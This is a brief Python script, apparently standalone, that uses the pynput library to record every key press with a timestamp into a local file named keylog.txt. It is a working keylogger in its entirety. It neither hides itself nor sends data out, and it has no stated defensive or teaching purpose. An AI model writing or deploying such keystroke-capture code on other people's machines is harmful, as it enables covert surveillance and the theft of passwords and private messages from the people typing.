from pynput import keyboard
import datetime

def on_key_press(key):
    log_file = open("keylog.txt", "a")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_file.write(f"{timestamp} - {key}\n")
    log_file.close()

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()